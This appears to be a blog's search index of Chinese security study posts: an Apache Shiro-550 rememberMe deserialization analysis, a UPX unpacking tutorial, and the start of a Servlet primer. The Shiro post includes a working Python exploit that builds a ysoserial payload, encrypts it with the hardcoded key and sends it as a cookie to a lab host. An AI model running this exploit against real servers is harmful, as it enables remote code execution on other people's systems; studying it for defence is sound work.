<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Shiro-550反序列化漏洞分析</title>
    <link href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p><p>首先找到硬编码key的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final byte[] DEFAULT_CIPHER_KEY_BYTES &#x3D; Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2Vwelq"><img src="https://z3.ax1x.com/2021/05/30/2Vwelq.png" alt="2Vwelq.png"></a></p><p>登陆，记得勾选Remember Me</p><p><a href="https://imgtu.com/i/2VwZpn"><img src="https://z3.ax1x.com/2021/05/30/2VwZpn.png" alt="2VwZpn.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code></p><p>remeberMe为true，接下来进入<code>remeberIdentity</code></p><p><a href="https://imgtu.com/i/2Vwm60"><img src="https://z3.ax1x.com/2021/05/30/2Vwm60.png" alt="2Vwm60.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>进入<code>rememberIdentity</code></p><p><a href="https://imgtu.com/i/2VwEfs"><img src="https://z3.ax1x.com/2021/05/30/2VwEfs.png" alt="2VwEfs.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>第一个函数<code>convertPrincipalsToBytes</code>中先序列化用户名，然后用硬编码的key进行了aes加密</p><p><a href="https://imgtu.com/i/2VwAYj"><img src="https://z3.ax1x.com/2021/05/30/2VwAYj.png" alt="2VwAYj.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code></p><p>先进行序列化操作，再调用<code>encrypt</code>进行加密</p><p><a href="https://imgtu.com/i/2VwnXV"><img src="https://z3.ax1x.com/2021/05/30/2VwnXV.png" alt="2VwnXV.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code></p><p>这里可知加密方法为<code>AES/CBC/PKCS5Padding</code>，通过<code>getEncryptionCipherkey</code>获取密钥</p><p><a href="https://imgtu.com/i/2VwQ7F"><img src="https://z3.ax1x.com/2021/05/30/2VwQ7F.png" alt="2VwQ7F.png"></a></p><p>ciphrtService</p><p><a href="https://imgtu.com/i/2Vw1k4"><img src="https://z3.ax1x.com/2021/05/30/2Vw1k4.png" alt="2Vw1k4.png"></a></p><h2 id="key的来源"><a href="#key的来源" class="headerlink" title="key的来源"></a>key的来源</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</code></p><p>很明显这个函数就是用来获取key的，可以看到key的来源是<code>encryptionCipherKey</code></p><p><a href="https://imgtu.com/i/2Vw3tJ"><img src="https://z3.ax1x.com/2021/05/30/2Vw3tJ.png" alt="2Vw3tJ.png"></a></p><p>在构造函数中，把硬编码key<code>DEFAULT_CIPHER_KEY_BYTES</code>作为参数传入<code>setCipherKey</code>，再经过<code>setEncryptionCipherKey</code>函数赋值给<code>encryptionCipherKey</code>，这样key就是已知的了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCipherKey</span><span class="params">(<span class="keyword">byte</span>[] cipherKey)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setEncryptionCipherKey(cipherKey);</span><br><span class="line">        <span class="keyword">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEncryptionCipherKey</span><span class="params">(<span class="keyword">byte</span>[] encryptionCipherKey)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="继续加密"><a href="#继续加密" class="headerlink" title="继续加密"></a>继续加密</h2><p>进入加密函数，两个参数分别是序列化后的root，和硬编码key</p><p><a href="https://imgtu.com/i/2Vw8h9"><img src="https://z3.ax1x.com/2021/05/30/2Vw8h9.png" alt="2Vw8h9.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p>回到<code>rememberIdentity</code>方法，<code>convertPrincipalsToBytes</code>方法执行完后返回了AES加密后的二进制字节流，接下来进入<code>rememberSerializedIdentity</code></p><p><a href="https://imgtu.com/i/2VwJpR"><img src="https://z3.ax1x.com/2021/05/30/2VwJpR.png" alt="2VwJpR.png"></a></p><p><code>org.apache.shiro.mgt.CookieRememberMeManager#rememberSerializedIdentity</code></p><p>这里的逻辑就很清楚了，把刚刚加密过的数据进行base64编码后再存入cookie</p><p><a href="https://imgtu.com/i/2VwanK"><img src="https://z3.ax1x.com/2021/05/30/2VwanK.png" alt="2VwanK.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要逻辑就是用序列化-&gt;AES-&gt;base64的方式处理cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</span><br><span class="line">判断是否选择了rememberMe选项</span><br><span class="line"></span><br><span class="line">2.org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</span><br><span class="line">调用convertPrincipalsToBytes和rememberSerializedIdentity</span><br><span class="line"></span><br><span class="line">3.org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</span><br><span class="line">序列化用户名并用硬编码key进行AES加密</span><br><span class="line"></span><br><span class="line">4.org.apache.shiro.mgt.CookieRememberMeManager#rememberSerializedIdentity</span><br><span class="line">把加密过的数据base64编码后写入cookie</span><br></pre></td></tr></table></figure><h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p>根据加密过程可以知道，解密过程一定经过了base64解码、AES解密、反序列化这几个步骤，接下来详细分析这几个步骤的执行过程，并找到反序列化点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readValue-&gt;getRememberedSerializedIdentity base64docode-&gt;convertBytesToP</span><br></pre></td></tr></table></figure><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code></p><p>在<code>decrypt</code>方法这里下一个断点</p><p>调用栈</p><p><a href="https://imgtu.com/i/2VwY11"><img src="https://z3.ax1x.com/2021/05/30/2VwY11.png" alt="2VwY11.png"></a></p><p><code>org.apache.shiro.mgt.DefaultSecurityManager#resolvePrincipals</code></p><p>作用是调用<code>getRememberedIdentity</code></p><p><a href="https://imgtu.com/i/2VwNX6"><img src="https://z3.ax1x.com/2021/05/30/2VwNX6.png" alt="2VwNX6.png"></a></p><p><code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code></p><p>作用是调用<code>getRememberedPrincipals</code></p><p><a href="https://imgtu.com/i/2Vww7D"><img src="https://z3.ax1x.com/2021/05/30/2Vww7D.png" alt="2Vww7D.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p><p>分别调用了<code>getRememberedSerializedIdentity</code>和<code>convertBytesToPrincipals</code>，前者对cookie进行base64解码，后者进行AES解密和反序列化。</p><p><a href="https://imgtu.com/i/2Vwd0O"><img src="https://z3.ax1x.com/2021/05/30/2Vwd0O.png" alt="2Vwd0O.png"></a></p><h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code></p><p>这里出现了读取cookie的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String base64 &#x3D; this.getCookie().readValue(request, response);</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2Vwrhd"><img src="https://z3.ax1x.com/2021/05/30/2Vwrhd.png" alt="2Vwrhd.png"></a></p><p><code>org.apache.shiro.web.servlet.SimpleCookie.readValue</code></p><p>getName()返回<code>rememberMe</code>，最终返回cookie中remeberMe的值</p><p><a href="https://imgtu.com/i/2VwDtH"><img src="https://z3.ax1x.com/2021/05/30/2VwDtH.png" alt="2VwDtH.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code></p><p>调用<code>decrypt</code>和<code>deserialize</code>，进行AES解密和反序列化操作</p><p><a href="https://imgtu.com/i/2VwBAe"><img src="https://z3.ax1x.com/2021/05/30/2VwBAe.png" alt="2VwBAe.png"></a></p><h2 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code></p><p>进行解密，<code>getCipherService()</code>获取加密方法<code>AES/CBC/PKCS5Padding</code></p><p><a href="https://imgtu.com/i/2Vw61I"><img src="https://z3.ax1x.com/2021/05/30/2Vw61I.png" alt="2Vw61I.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#decrypt</code></p><p>继续进入<code>decrypt</code></p><p><a href="https://imgtu.com/i/2VwRnf"><img src="https://z3.ax1x.com/2021/05/30/2VwRnf.png" alt="2VwRnf.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#decrypt</code></p><p>接下来进入<code>crypt</code></p><p><a href="https://imgtu.com/i/2Vwcct"><img src="https://z3.ax1x.com/2021/05/30/2Vwcct.png" alt="2Vwcct.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#crypt</code></p><p>到这里已经基本完成解密，接下来就是反序列化操作了</p><p><a href="https://imgtu.com/i/2VwgjP"><img src="https://z3.ax1x.com/2021/05/30/2VwgjP.png" alt="2VwgjP.png"></a></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code></p><p>回到上面的<code>convertBytesToPrincipals</code>，继续进入<code>deserialize</code>进行反序列化</p><p><a href="https://imgtu.com/i/2VwWB8"><img src="https://z3.ax1x.com/2021/05/30/2VwWB8.png" alt="2VwWB8.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></p><p>调用<code>deserialize</code></p><p><a href="https://imgtu.com/i/2VwfHS"><img src="https://z3.ax1x.com/2021/05/30/2VwfHS.png" alt="2VwfHS.png"></a></p><p><code>org.apache.shiro.io.DefaultSerializer#deserialize</code></p><p>出现readObject，将输入参数进行反序列化</p><p><a href="https://imgtu.com/i/2Vw5NQ"><img src="https://z3.ax1x.com/2021/05/30/2Vw5NQ.png" alt="2Vw5NQ.png"></a></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>cookie base64解码 AES解密 反序列化</p><p>主要执行流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</span><br><span class="line">调用getRememberedSerializedIdentity方法和convertBytesToPrincipals</span><br><span class="line">2.org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</span><br><span class="line">base64解码</span><br><span class="line">3.org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span><br><span class="line">进行AES解密</span><br><span class="line">4.org.apache.shiro.io.DefaultSerializer#deserialize</span><br><span class="line">进行反序列化</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>参考链接里的exp，Demo选择的Gadget是CommonsCollections2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="comment"># 这里使用CommonsCollections2模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># cc2的exp</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;rememberMe&quot;</span>: payload.decode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.get(url=<span class="string">&quot;http://192.168.199.152:8080/web_war/&quot;</span>, cookies=cookie)</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2VwT9s"><img src="https://z3.ax1x.com/2021/05/30/2VwT9s.png" alt="2VwT9s.png"></a></p><p>弹出计算器</p><p><a href="https://imgtu.com/i/2Vw73n"><img src="https://z3.ax1x.com/2021/05/30/2Vw73n.png" alt="2Vw73n.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/">http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/</a></p><p><a href="https://blog.csdn.net/god_zzZ/article/details/108391075">https://blog.csdn.net/god_zzZ/article/details/108391075</a></p><p><a href="https://www.anquanke.com/post/id/225442#h3-6">https://www.anquanke.com/post/id/225442#h3-6</a></p><p><a href="https://xz.aliyun.com/t/8997#toc-3">https://xz.aliyun.com/t/8997#toc-3</a></p><p><a href="https://www.freebuf.com/vuls/264079.html">https://www.freebuf.com/vuls/264079.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP定律和动态脱UPX壳</title>
    <link href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/"/>
    <url>/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="关于ESP定律"><a href="#关于ESP定律" class="headerlink" title="关于ESP定律"></a>关于ESP定律</h1><p>简单来说，给栈顶ESP下硬件断点，ESP被拿走的时候就会停住，而在ESP上面push值或者pop值都不会停住</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S:Stack栈</span><br><span class="line">P:Pointer指针</span><br></pre></td></tr></table></figure><p>注意栈底部大上面小，SP是栈顶指针，一有羽毛球进去就会减少4个大小</p><p><a href="https://imgtu.com/i/2FnutA"><img src="https://z3.ax1x.com/2021/05/28/2FnutA.png" alt="2FnutA.png"></a></p><p>先放了一个球进栈，ESP值由开始的<code>0012FFC4</code>减去4变成了<code>0012FFC0</code></p><p><a href="https://imgtu.com/i/2Fnnkd"><img src="https://z3.ax1x.com/2021/05/28/2Fnnkd.png" alt="2Fnnkd.png"></a></p><p>再放一个ESP又减去4</p><p><a href="https://imgtu.com/i/2FneTH"><img src="https://z3.ax1x.com/2021/05/28/2FneTH.png" alt="2FneTH.png"></a></p><p>所有的步骤执行完，ESP变成了<code>0012FFA4</code></p><p><a href="https://imgtu.com/i/2FnVmD"><img src="https://z3.ax1x.com/2021/05/28/2FnVmD.png" alt="2FnVmD.png"></a></p><p>现在正式开始ESP定律</p><p>在<code>0012FFA4</code>下一个硬件访问断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端点：就是运行到这个地方暂停</span><br><span class="line">访问断电：再次访问0012FFA4这个地址就停下来</span><br><span class="line">硬件访问端点：可以设置在任何位置上（普通软件断点可以用于内存，堆栈上。要记住）</span><br></pre></td></tr></table></figure><p>下列语句执行完后</p><p><a href="https://imgtu.com/i/2FnKfI"><img src="https://z3.ax1x.com/2021/05/28/2FnKfI.png" alt="2FnKfI.png"></a></p><p>上面语句执行完后，结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问断点：0012FFA4 EDI这个羽毛球不在桶里的时候，一改变就停止</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2FnZ0e"><img src="https://z3.ax1x.com/2021/05/28/2FnZ0e.png" alt="2FnZ0e.png"></a></p><p>现在给<code>0012FFAC</code>处下了硬件访问断点，研究一下怎么才会停下</p><p>这两种都不会停下</p><p>在栈顶<code>0012FFAC</code>上面加了两个新的羽毛球</p><p><a href="https://imgtu.com/i/2FnY7Q"><img src="https://z3.ax1x.com/2021/05/28/2FnY7Q.png" alt="2FnY7Q.png"></a></p><p>又把刚才加的两个拿走了，也没有影响</p><p><a href="https://imgtu.com/i/2Fn3X8"><img src="https://z3.ax1x.com/2021/05/28/2Fn3X8.png" alt="2Fn3X8.png"></a></p><p>这个才会停下，一定要把<code>0012FFAC</code>位置上的给拿走了（pop），才会停住</p><p><a href="https://imgtu.com/i/2FnUts"><img src="https://z3.ax1x.com/2021/05/28/2FnUts.png" alt="2FnUts.png"></a></p><h2 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单来说：</span><br><span class="line">程序1（解压代码）执行过程中往栈里先push再pop-&gt;执行结束后栈为空，真正代码开始执行，找到OEP</span><br></pre></td></tr></table></figure><p>upx加壳后的程序运行时会先加载upx加入的代码（我们叫它程序1），把压缩后的代码还原出来。程序1是一个完整的程序，作用是解码后面的代码</p><p><a href="https://imgtu.com/i/2FnQpt"><img src="https://z3.ax1x.com/2021/05/28/2FnQpt.png" alt="2FnQpt.png"></a></p><p>完整的程序什么时候结束？</p><p>当栈第一次回到初始状态的时候</p><p><a href="https://imgtu.com/i/2Fn16f"><img src="https://z3.ax1x.com/2021/05/28/2Fn16f.png" alt="2Fn16f.png"></a></p><p>没开始执行时栈是空的，程序开始执行后程序1入栈（想象push了很多值进栈）</p><p>现在栈还是空的，</p><p><a href="https://imgtu.com/i/2FnGnS"><img src="https://z3.ax1x.com/2021/05/28/2FnGnS.png" alt="2FnGnS.png"></a></p><p>程序1先入栈（push一些值进栈）</p><p><a href="https://imgtu.com/i/2FnJ0g"><img src="https://z3.ax1x.com/2021/05/28/2FnJ0g.png" alt="2FnJ0g.png"></a></p><p>程序1.1入栈（又push了一些值进栈）</p><p><a href="https://imgtu.com/i/2FnNkj"><img src="https://z3.ax1x.com/2021/05/28/2FnNkj.png" alt="2FnNkj.png"></a></p><p>接着程序1.1和程序1陆续出栈，栈空了，解压代码执行结束。</p><p>程序1也就是解压代码执行完后，栈返回初始空状态，这里就是程序真正开始的地方，也就是我们要找的<code>OEP</code></p><p><a href="https://imgtu.com/i/2Fnahn"><img src="https://z3.ax1x.com/2021/05/28/2Fnahn.png" alt="2Fnahn.png"></a></p><h2 id="ESP定律的变形用法"><a href="#ESP定律的变形用法" class="headerlink" title="ESP定律的变形用法"></a>ESP定律的变形用法</h2><p>初始状态的ESP地址为<code>0012FFC4</code>，在它的上一个地址<code>0012FFC0</code>下一个硬件访问断点</p><p><a href="https://imgtu.com/i/2Fnwpq"><img src="https://z3.ax1x.com/2021/05/28/2Fnwpq.png" alt="2Fnwpq.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初始ESP指向0012FFC4，upx加壳程序运行时先执行解压代码，解压代码会在栈里先pushad再popad，在解压代码执行完后栈空了，只要事先在0012FFC4的上面0012FFC0下一个硬件访问断点，这样popad拿到初始ESP的时候就停住了，</span><br></pre></td></tr></table></figure><h1 id="动态脱upx壳"><a href="#动态脱upx壳" class="headerlink" title="动态脱upx壳"></a>动态脱upx壳</h1><p>起点</p><p><a href="https://imgtu.com/i/2Fn010"><img src="https://z3.ax1x.com/2021/05/28/2Fn010.png" alt="2Fn010.png"></a></p><p>接下来按f8单步执行pushad指令，再设置硬件读取断点</p><p><a href="https://imgtu.com/i/2FnsnU"><img src="https://z3.ax1x.com/2021/05/28/2FnsnU.png" alt="2FnsnU.png"></a></p><p>设置完按f9运行程序，再次中断在一个不同的地址。这里并不是真实的程序代码，而是一个将栈空间向上清零0x80长度的循环。后面跟着一个向前的远距离的跳转（0043208C跳到00404DDC），这个就是跳到源代码的跳转（壳程序一般与程序原来的代码在不同的区段，故相隔较远）。</p><p><a href="https://imgtu.com/i/2Fnh1x"><img src="https://z3.ax1x.com/2021/05/28/2Fnh1x.png" alt="2Fnh1x.png"></a></p><p>接下来删除硬件断点，菜单栏选择<code>调试-&gt;硬件断点</code></p><p><a href="https://imgtu.com/i/2FnBcV"><img src="https://z3.ax1x.com/2021/05/28/2FnBcV.png" alt="2FnBcV.png"></a></p><p>把光标移动到这个jmp，按f4使得程序执行到光标处，再按f8执行跳转</p><p><a href="https://imgtu.com/i/2FnDXT"><img src="https://z3.ax1x.com/2021/05/28/2FnDXT.png" alt="2FnDXT.png"></a></p><p>跳转后出现了正常的函数开头和结尾，判断这个代码片段属于原程序</p><p>开头</p><p><a href="https://imgtu.com/i/2Fn674"><img src="https://z3.ax1x.com/2021/05/28/2Fn674.png" alt="2Fn674.png"></a></p><p>结尾</p><p><a href="https://imgtu.com/i/2FnyBF"><img src="https://z3.ax1x.com/2021/05/28/2FnyBF.png" alt="2FnyBF.png"></a></p><p>对程序进行Dump，在插件中选择脱壳程序</p><p><a href="https://imgtu.com/i/2FngAJ"><img src="https://z3.ax1x.com/2021/05/28/2FngAJ.png" alt="2FngAJ.png"></a></p><p>单击获取EIP作为OEP，再单击脱壳</p><p><a href="https://imgtu.com/i/2Fn2N9"><img src="https://z3.ax1x.com/2021/05/28/2Fn2N9.png" alt="2Fn2N9.png"></a></p><p>保存脱壳后的文件，然后用ida打开，可以看到被完全还原</p><p><a href="https://imgtu.com/i/2Fnf91"><img src="https://z3.ax1x.com/2021/05/28/2Fnf91.png" alt="2Fnf91.png"></a></p><p>运行正常</p><p><a href="https://imgtu.com/i/2FnRhR"><img src="https://z3.ax1x.com/2021/05/28/2FnRhR.png" alt="2FnRhR.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Servlet学习</title>
    <link href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Servlet</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java  Servlet（Java服务器小程序）是一个基于Java技术的Web组件，运行在服务器端，它由Servlet容器所管理，用于生成动态的内容。  Servlet是平台独立的Java类，编写一个Servlet，实际上就是按照Servlet规范编写一个Java类。Servlet被编译为平台独立 的字节码，可以被动态地加载到支持Java技术的Web服务器中运行。</span><br></pre></td></tr></table></figure><p>Servlet容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Servlet容器也叫做Servlet引擎，是Web服务器或应用程序服务器的一部分，用于在发送的请求和响应之上提供网络服务，解码基于  MIME的请求，格式化基于MIME的响应。Servlet没有main方法，不能独立运行，它必须被部署到Servlet容器中，由容器来实例化和调用  Servlet的方法（如doGet()和doPost()），Servlet容器在Servlet的生命周期内包容和管理Servlet。在JSP技术 推出后，管理和运行Servlet&#x2F;JSP的容器也称为Web容器。</span><br></pre></td></tr></table></figure><p> Tomcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Tomcat是一个免费的开放源代码的Servlet容器。</span><br><span class="line">Tomcat服务器接受客户请求并做出响应的过程如下，与上图类似：</span><br><span class="line">1）客户端（通常都是浏览器）访问Web服务器，发送HTTP请求。 </span><br><span class="line">2）Web服务器接收到请求后，传递给Servlet容器。 </span><br><span class="line">3）Servlet容器加载Servlet，产生Servlet实例后，向其传递表示请求和响应的对象。 </span><br><span class="line">4）Servlet实例使用请求对象得到客户端的请求信息，然后进行相应的处理。 </span><br><span class="line">5）Servlet实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web服务器。</span><br></pre></td></tr></table></figure><h1 id="tomcat目录结构"><a href="#tomcat目录结构" class="headerlink" 